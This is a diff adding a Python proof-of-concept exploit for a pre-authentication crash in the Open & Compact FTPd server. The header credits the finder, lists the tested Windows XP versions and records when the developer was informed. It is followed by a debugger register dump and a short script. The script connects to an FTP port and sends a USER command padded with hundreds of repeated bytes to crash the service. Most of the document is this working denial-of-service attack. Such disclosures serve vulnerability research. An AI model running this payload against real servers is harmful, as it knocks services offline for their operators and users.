@@ -1,0 +1,59 @@
+# Title: Open & Compact FTPd Pre-Authentication Crash (PoC)
+# Found by: loneferret
+# Hat's off to dookie2000ca
+# Date Found: 07/02/2010
+# Software link: https://sourceforge.net/projects/open-ftpd/
+# Tested on: Windows XP SP2/SP3 Professional
+# Nod to the Exploit-DB Team
+#
+# It's really just a DoS, but if someone can find more go ahead
+#
+#!/usr/bin/python
+
+#Registers From Immunity 
+#
+#EAX FFFFFFFF
+#ECX 00149A29
+#EDX 7C90E4F4 ntdll.KiFastSystemCallRet
+#EBX 00000000
+#ESP 0012FA1C
+#EBP 00000002
+#ESI 0012FA5C
+#EDI 0012FCB4
+#EIP 004113A3
+#C 0  ES 0023 32bit 0(FFFFFFFF)
+#P 1  CS 001B 32bit 0(FFFFFFFF)
+#A 0  SS 0023 32bit 0(FFFFFFFF)
+#Z 0  DS 0023 32bit 0(FFFFFFFF)
+#S 1  FS 003B 32bit 7FFDF000(FFF)
+#T 0  GS 0000 NULL
+#D 0
+#O 0  LastErr ERROR_SUCCESS (00000000)
+#EFL 00010286 (NO,NB,NE,A,S,PE,L,LE)
+#ST0 empty %#.19L
+#ST1 empty -??? FFFF 7C910208 7C90E900
+#ST2 empty -UNORM DCD0 7C9101BB 7C91017B
+#ST3 empty %#.19L
+#ST4 empty +UNORM 00B2 00000000 00000000
+#ST5 empty +UNORM 7D80 77F67D78 01C3DA90
+#ST6 empty -UNORM DD24 00000000 00000409
+#ST7 empty -UNORM E3F4 0014E3F4 0014E3F4
+#               3 2 1 0      E S P U O Z D I
+#FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+#FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+#
+#Developper Informed on: 07/02/2010
+#Developper Contacted second time on: 08/02/2010
+#
+
+import socket
+
+buffer = ("\x41\x2C\x20") * 200
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('192.168.1.112',21))
+s.recv(1024)
+s.send('USER '+buffer+'\r\n')
+s.recv(1024)
